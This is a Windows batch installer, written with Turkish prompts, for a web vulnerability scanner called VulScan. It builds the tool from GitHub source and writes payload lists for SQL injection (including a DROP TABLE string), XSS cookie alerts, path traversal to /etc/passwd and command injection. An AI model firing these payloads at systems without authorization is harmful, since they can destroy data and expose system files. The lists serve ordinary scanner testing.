@echo off
setlocal enabledelayedexpansion
title VulScan Windows Installer v3.1.0
color 0A
echo.
echo  ██╗   ██╗██╗   ██╗██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
echo  ██║   ██║██║   ██║██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
echo  ██║   ██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
echo  ╚██╗ ██╔╝██║   ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
echo   ╚████╔╝ ╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████╝
echo    ╚═══╝   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
echo.
echo                VulScan Windows Installer v3.1.0
echo                  Advanced Web Security Scanner
echo                    by ATOMGAMERAGA
echo.
echo ══════════════════════════════════════════════════════════════════
echo.

:: Check admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Bu installer yönetici hakları gerektirir!
    echo [INFO]  Sağ tık yapıp "Yönetici olarak çalıştır" seçeneğini kullanın.
    echo.
    pause
    exit /b 1
)

echo [INFO] Yönetici hakları doğrulandı ✓
echo.

:: Set installation paths
set "INSTALL_DIR=C:\Program Files\VulScan"
set "CONFIG_DIR=C:\ProgramData\VulScan"
set "TEMP_DIR=%TEMP%\VulScan_Install"
set "PAYLOADS_DIR=%CONFIG_DIR%\payloads"

echo [INFO] Kurulum dizini: %INSTALL_DIR%
echo [INFO] Yapılandırma dizini: %CONFIG_DIR%
echo.

:: Version selection menu
echo ══════════════════════════════════════════════════════════════════
echo                         SÜRÜM SEÇİMİ
echo ══════════════════════════════════════════════════════════════════
echo.
echo Hangi sürümü kurmak istiyorsunuz?
echo.
echo [1] Stable Release (v3.0) - Kararlı sürüm
echo     └─ Ana geliştirme dalı, test edilmiş ve kararlı
echo     └─ GitHub: https://github.com/ATOMGAMERAGA/VulScan/blob/main/main.go
echo.
echo [2] Development Release (v3.0.1-dev) - Geliştirme sürümü
echo     └─ Yeni özellikler, güncel güncellemeler
echo     └─ GitHub: https://github.com/ATOMGAMERAGA/VulScan/blob/main/dev/main-3.0.1.go
echo.
echo [3] Manuel Kurulum - Kendi .exe dosyanızı kullanın
echo.

set /p version_choice="Seçiminizi yapın (1/2/3): "

if "%version_choice%"=="1" (
    set "DOWNLOAD_URL=https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/main.go"
    set "VERSION_TAG=v3.0-stable"
    echo [INFO] Stable Release seçildi
) else if "%version_choice%"=="2" (
    set "DOWNLOAD_URL=https://raw.githubusercontent.com/ATOMGAMERAGA/VulScan/main/dev/main-3.0.1.go"
    set "VERSION_TAG=v3.0.1-dev"
    echo [INFO] Development Release seçildi
) else if "%version_choice%"=="3" (
    goto :manual_setup
) else (
    echo [ERROR] Geçersiz seçim!
    pause
    exit /b 1
)

echo.

:: Check if Go is installed
echo [INFO] Go kurulumu kontrol ediliyor...
where go >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Go bulunamadı! VulScan'i derlemek için Go gerekli.
    echo.
    echo Go'yu şuradan indirip kurun: https://golang.org/dl/
    echo Kurulum tamamlandıktan sonra bu installer'ı tekrar çalıştırın.
    echo.
    echo Alternatif olarak manuel kurulum seçeneğini kullanabilirsiniz.
    pause
    exit /b 1
)

for /f "tokens=3" %%i in ('go version') do set "GO_VERSION=%%i"
echo [INFO] Go bulundu: %GO_VERSION% ✓
echo.

:: Create temporary directory
if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%"
mkdir "%TEMP_DIR%"

:: Download source code
echo [INFO] Kaynak kod indiriliyor...
echo [URL] %DOWNLOAD_URL%

powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_DIR%\main.go' -UserAgent 'VulScan-Installer/3.1.0'}" 2>nul

if not exist "%TEMP_DIR%\main.go" (
    echo [ERROR] Kaynak kod indirilemedi!
    echo [INFO]  İnternet bağlantınızı kontrol edin veya manuel kurulum yapın.
    pause
    exit /b 1
)

echo [INFO] Kaynak kod başarıyla indirildi ✓
echo.

:: Create go.mod file
echo [INFO] Go modülü hazırlanıyor...
cd /d "%TEMP_DIR%"

echo module VulScan > go.mod
echo. >> go.mod
echo go 1.19 >> go.mod
echo. >> go.mod
echo require ( >> go.mod
echo     golang.org/x/time v0.3.0 >> go.mod
echo     gopkg.in/yaml.v3 v3.0.1 >> go.mod
echo ) >> go.mod

:: Download dependencies
echo [INFO] Bağımlılıklar indiriliyor...
go mod tidy >nul 2>&1

if %errorLevel% neq 0 (
    echo [WARNING] Bazı bağımlılıklar indirilemedi, devam ediliyor...
)

:: Build executable
echo [INFO] VulScan derleniyor...
go build -ldflags "-s -w -X main.Version=%VERSION_TAG%" -o vulscan.exe main.go

if not exist "vulscan.exe" (
    echo [ERROR] Derleme başarısız!
    echo [INFO]  Go kurulumunuzu kontrol edin veya manuel kurulum yapın.
    pause
    exit /b 1
)

echo [INFO] Derleme başarılı ✓
goto :install_files

:manual_setup
echo.
echo ══════════════════════════════════════════════════════════════════
echo                        MANUEL KURULUM
echo ══════════════════════════════════════════════════════════════════
echo.
echo [INFO] Manuel kurulum modu seçildi.
echo [INFO] Lütfen 'vulscan.exe' dosyasını bu klasöre koyun: %~dp0
echo.
set /p "manual_confirm=Hazır olduğunuzda Enter'a basın..."

if not exist "%~dp0vulscan.exe" (
    echo [ERROR] vulscan.exe dosyası bulunamadı!
    echo [INFO]  Dosyayı %~dp0 klasörüne koyup tekrar deneyin.
    pause
    exit /b 1
)

set "TEMP_DIR=%~dp0"
echo [INFO] Manuel .exe dosyası bulundu ✓
echo.

:install_files
:: Create installation directories
echo [INFO] Kurulum dizinleri oluşturuluyor...

if exist "%INSTALL_DIR%" (
    echo [INFO] Mevcut kurulum kaldırılıyor...
    rmdir /s /q "%INSTALL_DIR%" 2>nul
)

mkdir "%INSTALL_DIR%" 2>nul
mkdir "%CONFIG_DIR%" 2>nul
mkdir "%PAYLOADS_DIR%" 2>nul

:: Copy executable
echo [INFO] Dosyalar kopyalanıyor...
copy "%TEMP_DIR%\vulscan.exe" "%INSTALL_DIR%\vulscan.exe" >nul

if %errorLevel% neq 0 (
    echo [ERROR] Dosya kopyalama başarısız!
    pause
    exit /b 1
)

:: Create batch wrapper for shorter commands
echo [INFO] Komut kısayolları oluşturuluyor...

:: Create vulscan.bat
echo @echo off > "%INSTALL_DIR%\vuls.bat"
echo "%INSTALL_DIR%\vulscan.exe" %%* >> "%INSTALL_DIR%\vuls.bat"

:: Create config.yaml
echo [INFO] Varsayılan yapılandırma oluşturuluyor...
(
echo # VulScan Configuration File
echo # Generated by Windows Installer v3.1.0
echo.
echo scan:
echo   threads: 5
echo   timeout: 10
echo   user_agent: "VulScan/%VERSION_TAG%"
echo   rate_limit: 10
echo.
echo payloads:
echo   sql_injection: "%PAYLOADS_DIR%\sql.txt"
echo   xss: "%PAYLOADS_DIR%\xss.txt"
echo   directory_traversal: "%PAYLOADS_DIR%\lfi.txt"
echo   command_injection: "%PAYLOADS_DIR%\cmd.txt"
echo.
echo output:
echo   verbose: false
echo   format: "json"
echo   report: false
) > "%CONFIG_DIR%\config.yaml"

:: Create payload files
echo [INFO] Payload dosyaları oluşturuluyor...

:: SQL Injection payloads
(
echo # SQL Injection Payloads
echo ' OR '1'='1
echo ' OR 1=1 --
echo ' UNION SELECT NULL--
echo '; DROP TABLE users; --
echo ' AND SLEEP^(5^) --
echo ' OR IF^(1=1,SLEEP^(5^),0^) --
echo admin'--
echo admin' #
echo ^) or '1'='1--
) > "%PAYLOADS_DIR%\sql.txt"

:: XSS payloads
(
echo # XSS Payloads
echo ^<script^>alert^('XSS'^)^</script^>
echo ^<script^>alert^(document.cookie^)^</script^>
echo ^<img src=x onerror=alert^('XSS'^)^>
echo ^<svg onload=alert^('XSS'^)^>
echo javascript:alert^('XSS'^)
echo '^>^<script^>alert^('XSS'^)^</script^>
echo "^>^<script^>alert^('XSS'^)^</script^>
) > "%PAYLOADS_DIR%\xss.txt"

:: LFI payloads
(
echo # Directory Traversal / LFI Payloads
echo ../
echo ..\
echo ../../../etc/passwd
echo ..\..\..\windows\system32\drivers\etc\hosts
echo ....//....//....//etc/passwd
echo ....\\....\\....\\windows\system32\drivers\etc\hosts
) > "%PAYLOADS_DIR%\lfi.txt"

:: Command Injection payloads
(
echo # Command Injection Payloads
echo ; ls
echo ^| id
echo ^& whoami
echo `id`
echo $^(id^)
echo ; cat /etc/passwd
echo ^| type c:\windows\system32\drivers\etc\hosts
echo ^& dir
echo ; uname -a
) > "%PAYLOADS_DIR%\cmd.txt"

:: Add to PATH
echo [INFO] PATH ortam değişkeni güncelleniyor...

:: Get current PATH
for /f "tokens=2*" %%i in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH 2^>nul') do set "CURRENT_PATH=%%j"

:: Check if already in PATH
echo %CURRENT_PATH% | find /i "%INSTALL_DIR%" >nul
if %errorLevel% neq 0 (
    :: Add to PATH
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH /t REG_EXPAND_SZ /d "%CURRENT_PATH%;%INSTALL_DIR%" /f >nul
    if %errorLevel% neq 0 (
        echo [WARNING] PATH güncellenemedi! Manuel olarak %INSTALL_DIR% ekleyin.
    ) else (
        echo [INFO] PATH başarıyla güncellendi ✓
    )
) else (
    echo [INFO] PATH zaten güncel ✓
)

:: Create start menu shortcuts
echo [INFO] Başlat menüsü kısayolları oluşturuluyor...
set "START_MENU=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
mkdir "%START_MENU%\VulScan" 2>nul

:: Create PowerShell script to create shortcuts
powershell -Command "& {$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%START_MENU%\VulScan\VulScan.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\vulscan.exe'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Description = 'VulScan - Web Security Scanner'; $Shortcut.Save()}" 2>nul

powershell -Command "& {$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%START_MENU%\VulScan\VulScan Command Prompt.lnk'); $Shortcut.TargetPath = 'cmd.exe'; $Shortcut.Arguments = '/k echo VulScan %VERSION_TAG% - Ready! ^& echo Type: vulscan --help for usage ^& echo.'; $Shortcut.WorkingDirectory = '%USERPROFILE%'; $Shortcut.Description = 'VulScan Command Prompt'; $Shortcut.Save()}" 2>nul

powershell -Command "& {$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%START_MENU%\VulScan\Uninstall VulScan.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\uninstall.bat'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Description = 'Uninstall VulScan'; $Shortcut.Save()}" 2>nul

:: Create uninstaller
echo [INFO] Kaldırma programı oluşturuluyor...
(
echo @echo off
echo title VulScan Uninstaller
echo color 0C
echo echo.
echo echo VulScan Uninstaller
echo echo ==================
echo echo.
echo set /p confirm="VulScan'i kaldırmak istediğinizden emin misiniz? (y/n): "
echo if /i "%%confirm%%" neq "y" (
echo     echo Kaldırma iptal edildi.
echo     pause
echo     exit /b 0
echo )
echo.
echo echo [INFO] VulScan kaldırılıyor...
echo.
echo :: Remove from PATH
echo for /f "tokens=2*" %%%%i in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH 2^^^>nul'^) do set "CURRENT_PATH=%%%%j"
echo set "NEW_PATH=%%CURRENT_PATH:%INSTALL_DIR%;=%%"
echo set "NEW_PATH=%%NEW_PATH:;%INSTALL_DIR%=%%"
echo reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH /t REG_EXPAND_SZ /d "%%NEW_PATH%%" /f ^^^>nul
echo.
echo :: Remove directories
echo rmdir /s /q "%INSTALL_DIR%" 2^^^>nul
echo rmdir /s /q "%CONFIG_DIR%" 2^^^>nul
echo rmdir /s /q "%START_MENU%\VulScan" 2^^^>nul
echo.
echo echo [INFO] VulScan başarıyla kaldırıldı!
echo echo [INFO] Yeni terminal oturumu açarak PATH değişikliklerini uygulayın.
echo pause
) > "%INSTALL_DIR%\uninstall.bat"

:: Create desktop shortcut
echo [INFO] Masaüstü kısayolu oluşturuluyor...
set /p create_desktop="Masaüstünde kısayol oluşturulsun mu? (y/n): "
if /i "%create_desktop%"=="y" (
    powershell -Command "& {$WshShell = New-Object -comObject WScript.Shell; $Desktop = $WshShell.SpecialFolders('Desktop'); $Shortcut = $WshShell.CreateShortcut('$Desktop\VulScan.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\vulscan.exe'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Description = 'VulScan - Web Security Scanner'; $Shortcut.Save()}" 2>nul
    echo [INFO] Masaüstü kısayolu oluşturuldu ✓
)

:: Register with Windows Programs
echo [INFO] Windows Programs listesine ekleniyor...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v DisplayName /t REG_SZ /d "VulScan - Web Security Scanner" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v DisplayVersion /t REG_SZ /d "%VERSION_TAG%" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v Publisher /t REG_SZ /d "ATOMGAMERAGA" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v UninstallString /t REG_SZ /d "%INSTALL_DIR%\uninstall.bat" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v InstallLocation /t REG_SZ /d "%INSTALL_DIR%" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VulScan" /v DisplayIcon /t REG_SZ /d "%INSTALL_DIR%\vulscan.exe" /f >nul

:: Clean up
if exist "%TEMP_DIR%\main.go" rmdir /s /q "%TEMP_DIR%" 2>nul

:: Installation complete
echo.
echo ══════════════════════════════════════════════════════════════════
echo                      KURULUM TAMAMLANDI!
echo ══════════════════════════════════════════════════════════════════
echo.
echo ✅ VulScan başarıyla kuruldu!
echo.
echo 📁 Kurulum dizini: %INSTALL_DIR%
echo ⚙️  Yapılandırma: %CONFIG_DIR%\config.yaml
echo 🎯 Payloadlar: %PAYLOADS_DIR%\
echo.
echo 🚀 KULLANIM ÖRNEKLERİ:
echo ────────────────────────────────────────────────────────────────
echo   vulscan http://example.com
echo   vulscan --help
echo   vulscan --verbose http://example.com/page.php?id=1
echo   vulscan --output report.json --report http://example.com
echo   vuls http://example.com  ^(kısa komut^)
echo.
echo 💡 İPUCU: Yeni terminal oturumu açarak komutları kullanmaya başlayın!
echo.
echo 📋 Başlat Menüsü: Başlat ^> VulScan
echo 🗑️  Kaldırmak için: %INSTALL_DIR%\uninstall.bat
echo.

:: Test installation
echo [TEST] Kurulum testi yapılıyor...
"%INSTALL_DIR%\vulscan.exe" --version >nul 2>&1
if %errorLevel% equ 0 (
    echo [INFO] ✅ Test başarılı!
) else (
    echo [WARNING] ⚠️ Test başarısız - Manuel kontrol gerekli
)

echo.
echo Kurulum tamamlandı! Yeni terminal açarak "vulscan --help" komutunu deneyin.
echo.
pause
